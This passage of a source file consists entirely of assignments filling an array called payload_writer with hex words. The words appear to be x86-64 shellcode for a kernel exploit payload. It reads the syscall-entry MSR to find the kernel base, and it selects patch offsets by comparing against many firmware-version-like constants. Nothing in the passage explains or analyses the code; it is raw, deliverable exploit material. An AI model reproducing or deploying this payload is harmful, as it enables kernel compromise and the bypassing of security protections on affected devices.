  payload_writer[575] = 0x850f0824;
  payload_writer[576] = 0x0000009d;
  payload_writer[577] = 0xc148320f;
  payload_writer[578] = 0x84c620e2;
  payload_writer[579] = 0x0000e824;
  payload_writer[580] = 0x09485500;
  payload_writer[581] = 0x2484c6d0;
  payload_writer[582] = 0x000000e9;
  payload_writer[583] = 0x2484c648;
  payload_writer[584] = 0x000000ea;
  payload_writer[585] = 0xa08d4c89;
  payload_writer[586] = 0xffcf14c0;
  payload_writer[587] = 0xeb2484c6;
  payload_writer[588] = 0xe5000000;
  payload_writer[589] = 0x24b48d48;
  payload_writer[590] = 0x000000e8;
  payload_writer[591] = 0xec2484c6;
  payload_writer[592] = 0x53000000;
  payload_writer[593] = 0x50b88d48;
  payload_writer[594] = 0xc600038a;
  payload_writer[595] = 0x00ed2484;
  payload_writer[596] = 0xba480000;
  payload_writer[597] = 0x0000000c;
  payload_writer[598] = 0xee2484c6;
  payload_writer[599] = 0x83000000;
  payload_writer[600] = 0xef2484c6;
  payload_writer[601] = 0xec000000;
  payload_writer[602] = 0xf02484c6;
  payload_writer[603] = 0x58000000;
  payload_writer[604] = 0xf12484c6;
  payload_writer[605] = 0x48000000;
  payload_writer[606] = 0xf22484c6;
  payload_writer[607] = 0x8d000000;
  payload_writer[608] = 0xf32484c6;
  payload_writer[609] = 0x1d000000;
  payload_writer[610] = 0x85d0ff41;
  payload_writer[611] = 0x47850fc0;
  payload_writer[612] = 0x48fffffc;
  payload_writer[613] = 0x382444c7;
  payload_writer[614] = 0x00000406;
  payload_writer[615] = 0x0000e2e9;
  payload_writer[616] = 0x48320f00;
  payload_writer[617] = 0xc620e2c1;
  payload_writer[618] = 0x7f242444;
  payload_writer[619] = 0xc6d00948;
  payload_writer[620] = 0x45252444;
  payload_writer[621] = 0x262444c6;
  payload_writer[622] = 0x748d484c;
  payload_writer[623] = 0x44c62424;
  payload_writer[624] = 0x48462724;
  payload_writer[625] = 0x14d0b88d;
  payload_writer[626] = 0x8948ffcf;
  payload_writer[627] = 0xba08244c;
  payload_writer[628] = 0x00000004;
  payload_writer[629] = 0x4cd0ff41;
  payload_writer[630] = 0x233a058b;
  payload_writer[631] = 0xc0850000;
  payload_writer[632] = 0x244c8b48;
  payload_writer[633] = 0xa5850f08;
  payload_writer[634] = 0x0f000000;
  payload_writer[635] = 0xe2c14832;
  payload_writer[636] = 0x2484c620;
  payload_writer[637] = 0x000000f4;
  payload_writer[638] = 0xd0094855;
  payload_writer[639] = 0xf52484c6;
  payload_writer[640] = 0x48000000;
  payload_writer[641] = 0xf62484c6;
  payload_writer[642] = 0x89000000;
  payload_writer[643] = 0xd0a08d4c;
  payload_writer[644] = 0xc6ffcf14;
  payload_writer[645] = 0x00f72484;
  payload_writer[646] = 0x48e50000;
  payload_writer[647] = 0xf424b48d;
  payload_writer[648] = 0xc6000000;
  payload_writer[649] = 0x00f82484;
  payload_writer[650] = 0x48530000;
  payload_writer[651] = 0x8a50b88d;
  payload_writer[652] = 0x84c60003;
  payload_writer[653] = 0x0000f924;
  payload_writer[654] = 0x0cba4800;
  payload_writer[655] = 0xc6000000;
  payload_writer[656] = 0x00fa2484;
  payload_writer[657] = 0xc6830000;
  payload_writer[658] = 0x00fb2484;
  payload_writer[659] = 0xc6ec0000;
  payload_writer[660] = 0x00fc2484;
  payload_writer[661] = 0xc6580000;
  payload_writer[662] = 0x00fd2484;
  payload_writer[663] = 0xc6480000;
  payload_writer[664] = 0x00fe2484;
  payload_writer[665] = 0xc68d0000;
  payload_writer[666] = 0x00ff2484;
  payload_writer[667] = 0x411d0000;
  payload_writer[668] = 0xc085d0ff;
  payload_writer[669] = 0xfb60850f;
  payload_writer[670] = 0xc748ffff;
  payload_writer[671] = 0x05382444;
  payload_writer[672] = 0x49000004;
  payload_writer[673] = 0x7024848d;
  payload_writer[674] = 0xe900286d;
  payload_writer[675] = 0x000003a8;
  payload_writer[676] = 0x8948320f;
  payload_writer[677] = 0x2444c6d7;
  payload_writer[678] = 0xc1487f28;
  payload_writer[679] = 0x44c620e7;
  payload_writer[680] = 0x48452924;
  payload_writer[681] = 0x44c6f809;
  payload_writer[682] = 0xc64c2a24;
  payload_writer[683] = 0x462b2444;
  payload_writer[684] = 0x24748d48;
  payload_writer[685] = 0x4c894828;
  payload_writer[686] = 0x8d480824;
  payload_writer[687] = 0xcf1600b8;
  payload_writer[688] = 0x0004baff;
  payload_writer[689] = 0xff410000;
  payload_writer[690] = 0x058b4cd0;
  payload_writer[691] = 0x00002248;
  payload_writer[692] = 0x8b48c085;
  payload_writer[693] = 0x0f08244c;
  payload_writer[694] = 0x0000a585;
  payload_writer[695] = 0x48320f00;
  payload_writer[696] = 0xc620e2c1;
  payload_writer[697] = 0x01002484;
  payload_writer[698] = 0x48550000;
  payload_writer[699] = 0x84c6d009;
  payload_writer[700] = 0x00010124;
  payload_writer[701] = 0x84c64800;
  payload_writer[702] = 0x00010224;
  payload_writer[703] = 0x8d4c8900;
  payload_writer[704] = 0xcf1600a0;
  payload_writer[705] = 0x2484c6ff;
  payload_writer[706] = 0x00000103;
  payload_writer[707] = 0xb48d48e5;
  payload_writer[708] = 0x00010024;
  payload_writer[709] = 0x2484c600;
  payload_writer[710] = 0x00000104;
  payload_writer[711] = 0xb88d4853;
  payload_writer[712] = 0x00038a50;
  payload_writer[713] = 0x052484c6;
  payload_writer[714] = 0x48000001;
  payload_writer[715] = 0x00000cba;
  payload_writer[716] = 0x2484c600;
  payload_writer[717] = 0x00000106;
  payload_writer[718] = 0x2484c683;
  payload_writer[719] = 0x00000107;
  payload_writer[720] = 0x2484c6ec;
  payload_writer[721] = 0x00000108;
  payload_writer[722] = 0x2484c658;
  payload_writer[723] = 0x00000109;
  payload_writer[724] = 0x2484c648;
  payload_writer[725] = 0x0000010a;
  payload_writer[726] = 0x2484c68d;
  payload_writer[727] = 0x0000010b;
  payload_writer[728] = 0xd0ff411d;
  payload_writer[729] = 0x850fc085;
  payload_writer[730] = 0xfffffa6e;
  payload_writer[731] = 0x2444c748;
  payload_writer[732] = 0x00040038;
  payload_writer[733] = 0x848d4900;
  payload_writer[734] = 0x286c4024;
  payload_writer[735] = 0x02b6e900;
  payload_writer[736] = 0x320f0000;
  payload_writer[737] = 0x20e2c148;
  payload_writer[738] = 0x2c2444c6;
  payload_writer[739] = 0xd009487f;
  payload_writer[740] = 0x2d2444c6;
  payload_writer[741] = 0x2444c645;
  payload_writer[742] = 0x8d484c2e;
  payload_writer[743] = 0xc62c2474;
  payload_writer[744] = 0x462f2444;
  payload_writer[745] = 0x00b88d48;
  payload_writer[746] = 0x48ffc5e0;
  payload_writer[747] = 0x08244c89;
  payload_writer[748] = 0x000004ba;
  payload_writer[749] = 0xd0ff4100;
  payload_writer[750] = 0x59058b4c;
  payload_writer[751] = 0x85000021;
  payload_writer[752] = 0x4c8b48c0;
  payload_writer[753] = 0x850f0824;
  payload_writer[754] = 0x00000099;
  payload_writer[755] = 0xc148320f;
  payload_writer[756] = 0x84c620e2;
  payload_writer[757] = 0x00010c24;
  payload_writer[758] = 0x89485500;
  payload_writer[759] = 0x2484c6d3;
  payload_writer[760] = 0x0000010d;
  payload_writer[761] = 0xc3094848;
  payload_writer[762] = 0x0e2484c6;
  payload_writer[763] = 0x89000001;
  payload_writer[764] = 0x0f2484c6;
  payload_writer[765] = 0xe5000001;
  payload_writer[766] = 0x24b48d48;
  payload_writer[767] = 0x0000010c;
  payload_writer[768] = 0x102484c6;
  payload_writer[769] = 0x53000001;
  payload_writer[770] = 0x20bb8d48;
  payload_writer[771] = 0xc6ffe3d6;
  payload_writer[772] = 0x01112484;
  payload_writer[773] = 0xba480000;
  payload_writer[774] = 0x0000000c;
  payload_writer[775] = 0x122484c6;
  payload_writer[776] = 0x83000001;
  payload_writer[777] = 0x132484c6;
  payload_writer[778] = 0xec000001;
  payload_writer[779] = 0x142484c6;
  payload_writer[780] = 0x58000001;
  payload_writer[781] = 0x152484c6;
  payload_writer[782] = 0x48000001;
  payload_writer[783] = 0x162484c6;
  payload_writer[784] = 0x8d000001;
  payload_writer[785] = 0x172484c6;
  payload_writer[786] = 0x1d000001;
  payload_writer[787] = 0x85d0ff41;
  payload_writer[788] = 0x83850fc0;
  payload_writer[789] = 0x48fffff9;
  payload_writer[790] = 0x382444c7;
  payload_writer[791] = 0x00000370;
  payload_writer[792] = 0x0001cce9;
  payload_writer[793] = 0x48320f00;
  payload_writer[794] = 0x44c6d789;
  payload_writer[795] = 0x487f3024;
  payload_writer[796] = 0xc620e7c1;
  payload_writer[797] = 0x45312444;
  payload_writer[798] = 0xc6f80948;
  payload_writer[799] = 0x4c322444;
  payload_writer[800] = 0x332444c6;
  payload_writer[801] = 0x748d4846;
  payload_writer[802] = 0x89483024;
  payload_writer[803] = 0x4808244c;
  payload_writer[804] = 0xe0f0b88d;
  payload_writer[805] = 0x04baffc5;
  payload_writer[806] = 0x41000000;
  payload_writer[807] = 0x8b4cd0ff;
  payload_writer[808] = 0x00207305;
  payload_writer[809] = 0x48c08500;
  payload_writer[810] = 0x08244c8b;
  payload_writer[811] = 0x00a4850f;
  payload_writer[812] = 0x320f0000;
  payload_writer[813] = 0x20e2c148;
  payload_writer[814] = 0x182484c6;
  payload_writer[815] = 0x55000001;
  payload_writer[816] = 0xc6d00948;
  payload_writer[817] = 0x01192484;
  payload_writer[818] = 0x48480000;
  payload_writer[819] = 0xe0f0988d;
  payload_writer[820] = 0x84c6ffc5;
  payload_writer[821] = 0x00011a24;
  payload_writer[822] = 0x84c68900;
  payload_writer[823] = 0x00011b24;
  payload_writer[824] = 0x8d48e500;
  payload_writer[825] = 0x011824b4;
  payload_writer[826] = 0x84c60000;
  payload_writer[827] = 0x00011c24;
  payload_writer[828] = 0x8d485300;
  payload_writer[829] = 0x1df550bb;
  payload_writer[830] = 0x2484c600;
  payload_writer[831] = 0x0000011d;
  payload_writer[832] = 0x000cba48;
  payload_writer[833] = 0x84c60000;
  payload_writer[834] = 0x00011e24;
  payload_writer[835] = 0x84c68300;
  payload_writer[836] = 0x00011f24;
  payload_writer[837] = 0x84c6ec00;
  payload_writer[838] = 0x00012024;
  payload_writer[839] = 0x84c65800;
  payload_writer[840] = 0x00012124;
  payload_writer[841] = 0x84c64800;
  payload_writer[842] = 0x00012224;
  payload_writer[843] = 0x84c68d00;
  payload_writer[844] = 0x00012324;
  payload_writer[845] = 0xff411d00;
  payload_writer[846] = 0x0fc085d0;
  payload_writer[847] = 0xfff89985;
  payload_writer[848] = 0x44c748ff;
  payload_writer[849] = 0x03553824;
  payload_writer[850] = 0x8d480000;
  payload_writer[851] = 0x3b966083;
  payload_writer[852] = 0x00e2e900;
  payload_writer[853] = 0x320f0000;
  payload_writer[854] = 0x20e2c148;
  payload_writer[855] = 0x342444c6;
  payload_writer[856] = 0xd009487f;
  payload_writer[857] = 0x352444c6;
  payload_writer[858] = 0x2444c645;
  payload_writer[859] = 0x04ba4c36;
  payload_writer[860] = 0xc6000000;
  payload_writer[861] = 0x46372444;
  payload_writer[862] = 0x24748d48;
  payload_writer[863] = 0xb88d4834;
  payload_writer[864] = 0xffc5e530;
  payload_writer[865] = 0x83d0ff41;
  payload_writer[866] = 0xc085ffca;
  payload_writer[867] = 0x00bb850f;
  payload_writer[868] = 0x82b90000;
  payload_writer[869] = 0xc6c00000;
  payload_writer[870] = 0x01242484;
  payload_writer[871] = 0x0f550000;
  payload_writer[872] = 0xd1894832;
  payload_writer[873] = 0x252484c6;
  payload_writer[874] = 0x48000001;
  payload_writer[875] = 0x20e1c148;
  payload_writer[876] = 0x262484c6;
  payload_writer[877] = 0x89000001;
  payload_writer[878] = 0xc6cb8948;
  payload_writer[879] = 0x01272484;
  payload_writer[880] = 0x48e50000;
  payload_writer[881] = 0x84c6c309;
  payload_writer[882] = 0x00012824;
  payload_writer[883] = 0x84c65300;
  payload_writer[884] = 0x00012924;
  payload_writer[885] = 0x8d484800;
  payload_writer[886] = 0x012424b4;
  payload_writer[887] = 0x84c60000;
  payload_writer[888] = 0x00012a24;
  payload_writer[889] = 0x8d488300;
  payload_writer[890] = 0xe3d940bb;
  payload_writer[891] = 0x2484c6ff;
  payload_writer[892] = 0x0000012b;
  payload_writer[893] = 0x000cbaec;
  payload_writer[894] = 0x84c60000;
  payload_writer[895] = 0x00012c24;
  payload_writer[896] = 0x84c65800;
  payload_writer[897] = 0x00012d24;
  payload_writer[898] = 0x84c64800;
  payload_writer[899] = 0x00012e24;
  payload_writer[900] = 0x84c68d00;
  payload_writer[901] = 0x00012f24;
  payload_writer[902] = 0x15ff1d00;
  payload_writer[903] = 0x00001ef8;
  payload_writer[904] = 0x850fc085;
  payload_writer[905] = 0xfffff7b2;
  payload_writer[906] = 0x2444c748;
  payload_writer[907] = 0x00035038;
  payload_writer[908] = 0x838d4800;
  payload_writer[909] = 0x00017750;
  payload_writer[910] = 0x084d8b48;
  payload_writer[911] = 0x000008ba;
  payload_writer[912] = 0x7c8d4800;
  payload_writer[913] = 0x8b483824;
  payload_writer[914] = 0x31d0ff31;
  payload_writer[915] = 0xc48148d2;
  payload_writer[916] = 0x00000130;
  payload_writer[917] = 0x5d5bd089;
  payload_writer[918] = 0x48c35c41;
  payload_writer[919] = 0x4c08478b;
  payload_writer[920] = 0x4c48488b;
  payload_writer[921] = 0x4840408b;
  payload_writer[922] = 0x4808468b;
  payload_writer[923] = 0x8148108b;
  payload_writer[924] = 0x000350fa;
  payload_writer[925] = 0xb9207500;
  payload_writer[926] = 0xc0000082;
  payload_writer[927] = 0xc148320f;
  payload_writer[928] = 0x094820e2;
  payload_writer[929] = 0xb08d48d0;
  payload_writer[930] = 0x00b53f30;
  payload_writer[931] = 0x15300548;
  payload_writer[932] = 0x1be9015c;
  payload_writer[933] = 0x48000003;
  payload_writer[934] = 0x0355fa81;
  payload_writer[935] = 0x20750000;
  payload_writer[936] = 0x000082b9;
  payload_writer[937] = 0x48320fc0;
  payload_writer[938] = 0x4820e2c1;
  payload_writer[939] = 0x8d48d009;
  payload_writer[940] = 0xb53af0b0;
  payload_writer[941] = 0x30054800;
  payload_writer[942] = 0xe9015c11;
  payload_writer[943] = 0x000002f2;
  payload_writer[944] = 0x70fa8148;
  payload_writer[945] = 0x75000003;
  payload_writer[946] = 0x0082b920;
  payload_writer[947] = 0x320fc000;
  payload_writer[948] = 0x20e2c148;
  payload_writer[949] = 0x48d00948;
  payload_writer[950] = 0xcf10b08d;
  payload_writer[951] = 0x054800b5;
  payload_writer[952] = 0x015cd040;
  payload_writer[953] = 0x0002c9e9;
  payload_writer[954] = 0xfa814800;
  payload_writer[955] = 0x00000400;
  payload_writer[956] = 0x82b92075;
  payload_writer[957] = 0x0fc00000;
  payload_writer[958] = 0xe2c14832;
  payload_writer[959] = 0xd0094820;
  payload_writer[960] = 0x10b08d48;
  payload_writer[961] = 0x4800c176;
  payload_writer[962] = 0xd5e85005;
  payload_writer[963] = 0x02a0e901;
  payload_writer[964] = 0x81480000;
  payload_writer[965] = 0x000405fa;
  payload_writer[966] = 0xb9207500;
  payload_writer[967] = 0xc0000082;
  payload_writer[968] = 0xc148320f;
  payload_writer[969] = 0x094820e2;
  payload_writer[970] = 0xb08d48d0;
  payload_writer[971] = 0x00c174e0;
  payload_writer[972] = 0xe7200548;
  payload_writer[973] = 0x77e901d5;
  payload_writer[974] = 0x48000002;
  payload_writer[975] = 0x0406fa81;
  payload_writer[976] = 0x20750000;
  payload_writer[977] = 0x000082b9;
  payload_writer[978] = 0x48320fc0;
  payload_writer[979] = 0x4820e2c1;
  payload_writer[980] = 0x8d48d009;
  payload_writer[981] = 0xc174d0b0;
  payload_writer[982] = 0x10054800;
  payload_writer[983] = 0xe901d5e7;
  payload_writer[984] = 0x0000024e;
  payload_writer[985] = 0x07fa8148;
  payload_writer[986] = 0x75000004;
  payload_writer[987] = 0x0082b923;
  payload_writer[988] = 0x320fc000;
  payload_writer[989] = 0x48d18948;
  payload_writer[990] = 0x4820e1c1;
  payload_writer[991] = 0x8d48c809;
  payload_writer[992] = 0xc1b4d0b0;
  payload_writer[993] = 0x10054800;
  payload_writer[994] = 0xe901d627;
  payload_writer[995] = 0x00000222;
  payload_writer[996] = 0x50fa8148;
  payload_writer[997] = 0x75000004;
  payload_writer[998] = 0x0082b920;
  payload_writer[999] = 0x320fc000;
  payload_writer[1000] = 0x20e2c148;
  payload_writer[1001] = 0x48d00948;
  payload_writer[1002] = 0x03e0b08d;
  payload_writer[1003] = 0x054800d3;
  payload_writer[1004] = 0x01ea6460;
  payload_writer[1005] = 0x0001f9e9;
  payload_writer[1006] = 0xfa814800;
  payload_writer[1007] = 0x00000470;
  payload_writer[1008] = 0x82b92375;
  payload_writer[1009] = 0x0fc00000;
  payload_writer[1010] = 0xd1894832;
  payload_writer[1011] = 0x20e1c148;
  payload_writer[1012] = 0x48c80948;
  payload_writer[1013] = 0x7270b08d;
  payload_writer[1014] = 0x054800d3;
  payload_writer[1015] = 0x01ead1a0;
  payload_writer[1016] = 0x0001cde9;
  payload_writer[1017] = 0xfa814800;
  payload_writer[1018] = 0x00000471;
  payload_writer[1019] = 0x82b92075;
  payload_writer[1020] = 0x0fc00000;
  payload_writer[1021] = 0xe2c14832;
  payload_writer[1022] = 0xd0094820;
  payload_writer[1023] = 0xe0b08d48;
  payload_writer[1024] = 0x4800d372;
  payload_writer[1025] = 0xead21005;
  payload_writer[1026] = 0x01a4e901;
  payload_writer[1027] = 0x81480000;
  payload_writer[1028] = 0x000500fa;
  payload_writer[1029] = 0xb9237500;
  payload_writer[1030] = 0xc0000082;
  payload_writer[1031] = 0x8948320f;
  payload_writer[1032] = 0xe1c148d1;
  payload_writer[1033] = 0xc8094820;
  payload_writer[1034] = 0xe0b08d48;
  payload_writer[1035] = 0x48010984;
  payload_writer[1036] = 0x2c183005;
  payload_writer[1037] = 0x0178e902;
  payload_writer[1038] = 0x81480000;
  payload_writer[1039] = 0x000503fa;
  payload_writer[1040] = 0xb9107500;
  payload_writer[1041] = 0xc0000082;
  payload_writer[1042] = 0xc148320f;
  payload_writer[1043] = 0x894820e2;
  payload_writer[1044] = 0x4817ebd1;
  payload_writer[1045] = 0x0505fa81;
  payload_writer[1046] = 0x23750000;
  payload_writer[1047] = 0x000082b9;
  payload_writer[1048] = 0x48320fc0;
  payload_writer[1049] = 0xc148d189;
  payload_writer[1050] = 0x094820e1;
  payload_writer[1051] = 0xb08d48c8;
  payload_writer[1052] = 0x010984e0;
  payload_writer[1053] = 0x18b00548;
  payload_writer[1054] = 0x33e9022c;
  payload_writer[1055] = 0x48000001;
  payload_writer[1056] = 0x0550fa81;
  payload_writer[1057] = 0x10750000;
  payload_writer[1058] = 0x000082b9;
  payload_writer[1059] = 0x48320fc0;
  payload_writer[1060] = 0x4820e2c1;
  payload_writer[1061] = 0x17ebd189;
  payload_writer[1062] = 0x53fa8148;
  payload_writer[1063] = 0x75000005;
  payload_writer[1064] = 0x0082b923;
  payload_writer[1065] = 0x320fc000;
  payload_writer[1066] = 0x48d18948;
  payload_writer[1067] = 0x4820e1c1;
  payload_writer[1068] = 0x8d48c809;
  payload_writer[1069] = 0x133fc0b0;
  payload_writer[1070] = 0xb0054801;
  payload_writer[1071] = 0xe9022ef3;
  payload_writer[1072] = 0x000000ee;
  payload_writer[1073] = 0x55fa8148;
  payload_writer[1074] = 0x75000005;
  payload_writer[1075] = 0x0082b920;
  payload_writer[1076] = 0x320fc000;
  payload_writer[1077] = 0x20e2c148;
  payload_writer[1078] = 0x48d00948;
  payload_writer[1079] = 0x8fc0b08d;
  payload_writer[1080] = 0x05480113;
  payload_writer[1081] = 0x022f33b0;
  payload_writer[1082] = 0x0000c5e9;
  payload_writer[1083] = 0xfa814800;
  payload_writer[1084] = 0x00000600;
  payload_writer[1085] = 0x82b92375;
  payload_writer[1086] = 0x0fc00000;
  payload_writer[1087] = 0xd1894832;
  payload_writer[1088] = 0x20e1c148;
  payload_writer[1089] = 0x48c80948;
  payload_writer[1090] = 0x9298b08d;
  payload_writer[1091] = 0x05480113;
  payload_writer[1092] = 0x021bf900;
  payload_writer[1093] = 0x000099e9;
  payload_writer[1094] = 0xfa814800;
  payload_writer[1095] = 0x00000620;
  payload_writer[1096] = 0x82b91d75;
  payload_writer[1097] = 0x0fc00000;
  payload_writer[1098] = 0xe2c14832;
  payload_writer[1099] = 0xd0094820;
  payload_writer[1100] = 0x98b08d48;
  payload_writer[1101] = 0x480113d2;
  payload_writer[1102] = 0x1c390005;
  payload_writer[1103] = 0x4873eb02;
  payload_writer[1104] = 0x0650fa81;
  payload_writer[1105] = 0x1a750000;
  payload_writer[1106] = 0x000082b9;
  payload_writer[1107] = 0x48320fc0;
  payload_writer[1108] = 0xc148d189;
  payload_writer[1109] = 0x094820e1;
  payload_writer[1110] = 0xb08d48c8;
  payload_writer[1111] = 0x0113d338;
  payload_writer[1112] = 0x81481eeb;
  payload_writer[1113] = 0x000670fa;
  payload_writer[1114] = 0xb91d7500;
  payload_writer[1115] = 0xc0000082;
  payload_writer[1116] = 0xc148320f;
  payload_writer[1117] = 0x094820e2;
  payload_writer[1118] = 0xb08d48d0;
  payload_writer[1119] = 0x0113e358;
  payload_writer[1120] = 0x01600548;
  payload_writer[1121] = 0x2aeb0230;
  payload_writer[1122] = 0x48ffc883;
  payload_writer[1123] = 0x0700fa81;
  payload_writer[1124] = 0x7c750000;
  payload_writer[1125] = 0x000082b9;
  payload_writer[1126] = 0x48320fc0;
  payload_writer[1127] = 0xc148d189;
  payload_writer[1128] = 0x094820e1;
  payload_writer[1129] = 0xb08d48c8;
  payload_writer[1130] = 0x0113e1d8;
  payload_writer[1131] = 0x55900548;
  payload_writer[1132] = 0x8b49022c;
  payload_writer[1133] = 0x00011890;
  payload_writer[1134] = 0x40c74100;
  payload_writer[1135] = 0x00000004;
  payload_writer[1136] = 0x40c74100;
  payload_writer[1137] = 0x00000008;
  payload_writer[1138] = 0x40c74100;
  payload_writer[1139] = 0x00000014;
  payload_writer[1140] = 0x0002c700;
  payload_writer[1141] = 0x48000000;
  payload_writer[1142] = 0x8949168b;
  payload_writer[1143] = 0x8b483050;
  payload_writer[1144] = 0x41894900;
  payload_writer[1145] = 0x41894920;
  payload_writer[1146] = 0x878b4818;
  payload_writer[1147] = 0x00000130;
  payload_writer[1148] = 0x0013bf48;
  payload_writer[1149] = 0x00000000;
  payload_writer[1150] = 0xc7483801;
  payload_writer[1151] = 0xffff6040;
  payload_writer[1152] = 0x8948ffff;
  payload_writer[1153] = 0xc7485878;
  payload_writer[1154] = 0xffff6840;
  payload_writer[1155] = 0xc031ffff;
  payload_writer[1156] = 0xec8348c3;
  payload_writer[1157] = 0x768b4818;
  payload_writer[1158] = 0x0082b908;
  payload_writer[1159] = 0x8b48c000;
  payload_writer[1160] = 0x503d4806;
  payload_writer[1161] = 0x75000003;
  payload_writer[1162] = 0x48320f15;
  payload_writer[1163] = 0xc148d189;
  payload_writer[1164] = 0x094820e1;
  payload_writer[1165] = 0x908d48c8;
  payload_writer[1166] = 0xffc5e530;
  payload_writer[1167] = 0x3d4818eb;
  payload_writer[1168] = 0x00000355;
  payload_writer[1169] = 0x320f1d75;
  payload_writer[1170] = 0x20e2c148;
  payload_writer[1171] = 0x48d00948;
  payload_writer[1172] = 0xe0f0908d;
  payload_writer[1173] = 0x8948ffc5;
  payload_writer[1174] = 0x48082454;
  payload_writer[1175] = 0x01775005;
  payload_writer[1176] = 0x4837eb00;
  payload_writer[1177] = 0x0003703d;
  payload_writer[1178] = 0x0f157500;
  payload_writer[1179] = 0xd1894832;
  payload_writer[1180] = 0x20e1c148;
  payload_writer[1181] = 0x48c80948;
  payload_writer[1182] = 0xe000908d;
  payload_writer[1183] = 0xd6ebffc5;
  payload_writer[1184] = 0xc148320f;
  payload_writer[1185] = 0x094820e2;
  payload_writer[1186] = 0x002d48d0;
  payload_writer[1187] = 0x480030ea;
  payload_writer[1188] = 0x08244489;
  payload_writer[1189] = 0x6c400548;
  payload_writer[1190] = 0x8b480028;
  payload_writer[1191] = 0x8d480876;
  payload_writer[1192] = 0xba08247c;
  payload_writer[1193] = 0x00000008;
  payload_writer[1194] = 0xc031d0ff;
  payload_writer[1195] = 0x18c48348;
  payload_writer[1196] = 0x555441c3;
  payload_writer[1197] = 0x768b4853;
  payload_writer[1198] = 0x0082b908;
  payload_writer[1199] = 0x8b48c000;
  payload_writer[1200] = 0x503d4806;
  payload_writer[1201] = 0x74000003;
  payload_writer[1202] = 0x553d4810;
  payload_writer[1203] = 0x74000003;
  payload_writer[1204] = 0x703d4808;
  payload_writer[1205] = 0x75000003;
  payload_writer[1206] = 0x48320f12;
  payload_writer[1207] = 0x4820e2c1;
  payload_writer[1208] = 0x8d48c209;
  payload_writer[1209] = 0x01775082;
  payload_writer[1210] = 0x0f10eb00;
  payload_writer[1211] = 0xe2c14832;
  payload_writer[1212] = 0xc2094820;
  payload_writer[1213] = 0x40828d48;
  payload_writer[1214] = 0x4cfff782;
  payload_writer[1215] = 0x4818668b;
  payload_writer[1216] = 0x48086e8b;
  payload_writer[1217] = 0x4c107e8b;
  payload_writer[1218] = 0x8948e289;
  payload_writer[1219] = 0x83d0ffee;
  payload_writer[1220] = 0xc389fff8;
  payload_writer[1221] = 0x894c0e75;
  payload_writer[1222] = 0x48f631e2;
  payload_writer[1223] = 0x15ffef89;
  payload_writer[1224] = 0x00001a44;
  payload_writer[1225] = 0x5d5bd889;
  payload_writer[1226] = 0x53c35c41;
  payload_writer[1227] = 0x48c93145;
  payload_writer[1228] = 0x4110ec83;
  payload_writer[1229] = 0xb9ffc883;
  payload_writer[1230] = 0x00001002;
  payload_writer[1231] = 0x000003ba;
  payload_writer[1232] = 0x0008be00;
  payload_writer[1233] = 0xff310000;
  payload_writer[1234] = 0x2404c748;
  payload_writer[1235] = 0x00000666;
  payload_writer[1236] = 0x0008d9e8;
  payload_writer[1237] = 0x748d4800;
  payload_writer[1238] = 0x8d480824;
  payload_writer[1239] = 0xffeca43d;
  payload_writer[1240] = 0xc38948ff;
  payload_writer[1241] = 0x24448948;
  payload_writer[1242] = 0x0327e808;
  payload_writer[1243] = 0x89480000;
  payload_writer[1244] = 0xde8948e7;
  payload_writer[1245] = 0x000008ba;
  payload_writer[1246] = 0xd915ff00;
  payload_writer[1247] = 0x48000018;
  payload_writer[1248] = 0x08bedf89;
  payload_writer[1249] = 0xe8000000;
  payload_writer[1250] = 0x000008ae;
  payload_writer[1251] = 0x24048b48;
  payload_writer[1252] = 0x10c48348;
  payload_writer[1253] = 0x8348c35b;
  payload_writer[1254] = 0x894818ec;
  payload_writer[1255] = 0x4808247c;
  payload_writer[1256] = 0x0824748d;
  payload_writer[1257] = 0xb03d8d48;
  payload_writer[1258] = 0xe8fffffa;
  payload_writer[1259] = 0x000002e5;
  payload_writer[1260] = 0x8348c031;
  payload_writer[1261] = 0x55c318c4;
  payload_writer[1262] = 0xec834853;
  payload_writer[1263] = 0xc8834928;
  payload_writer[1264] = 0xc93145ff;
  payload_writer[1265] = 0x001002b9;
  payload_writer[1266] = 0xfd894800;
  payload_writer[1267] = 0x000003ba;
  payload_writer[1268] = 0x0008be00;
  payload_writer[1269] = 0xff310000;
  payload_writer[1270] = 0x2444894c;
  payload_writer[1271] = 0x084ce808;
  payload_writer[1272] = 0x8d480000;
  payload_writer[1273] = 0x48102474;
  payload_writer[1274] = 0xfe233d8d;
  payload_writer[1275] = 0x8948ffff;
  payload_writer[1276] = 0x6c8948c3;
  payload_writer[1277] = 0x89481024;
  payload_writer[1278] = 0xe8182444;
  payload_writer[1279] = 0x00000295;
  payload_writer[1280] = 0x247c8d48;
  payload_writer[1281] = 0xde894808;
  payload_writer[1282] = 0x000008ba;
  payload_writer[1283] = 0x4515ff00;
  payload_writer[1284] = 0x48000018;
  payload_writer[1285] = 0x08bedf89;
  payload_writer[1286] = 0xe8000000;
  payload_writer[1287] = 0x0000081a;
  payload_writer[1288] = 0x24448b48;
  payload_writer[1289] = 0xc4834808;
  payload_writer[1290] = 0xc35d5b28;
  payload_writer[1291] = 0x28ec8348;
  payload_writer[1292] = 0x243c8948;
  payload_writer[1293] = 0x763d8d48;
  payload_writer[1294] = 0x48fffffe;
  payload_writer[1295] = 0x10247489;
  payload_writer[1296] = 0x48e68948;
  payload_writer[1297] = 0x08245489;
  payload_writer[1298] = 0x244c8948;
  payload_writer[1299] = 0x0243e818;
  payload_writer[1300] = 0xc0310000;
  payload_writer[1301] = 0x28c48348;
  payload_writer[1302] = 0x415741c3;
  payload_writer[1303] = 0x41554156;
  payload_writer[1304] = 0x48535554;
  payload_writer[1305] = 0x0168ec81;
  payload_writer[1306] = 0xed310000;
  payload_writer[1307] = 0x000230e8;
  payload_writer[1308] = 0x095fe800;
  payload_writer[1309] = 0x13e80000;
  payload_writer[1310] = 0xe8000008;
  payload_writer[1311] = 0xfffffeab;
  payload_writer[1312] = 0x245c8d48;
  payload_writer[1313] = 0x748d4c60;
  payload_writer[1314] = 0x89492024;
  payload_writer[1315] = 0xc78948c5;
  payload_writer[1316] = 0xffff01e8;
  payload_writer[1317] = 0xef894cff;
  payload_writer[1318] = 0xffff1ae8;
  payload_writer[1319] = 0x448948ff;
  payload_writer[1320] = 0xb3e80824;
  payload_writer[1321] = 0x48000005;
  payload_writer[1322] = 0x0e49158d;
  payload_writer[1323] = 0x00be0000;
  payload_writer[1324] = 0x48000001;
  payload_writer[1325] = 0xc031df89;
  payload_writer[1326] = 0x179215ff;
  payload_writer[1327] = 0x89480000;
  payload_writer[1328] = 0x05fae8df;
  payload_writer[1329] = 0xa0bf0000;
  payload_writer[1330] = 0xff000186;
  payload_writer[1331] = 0x00167f15;
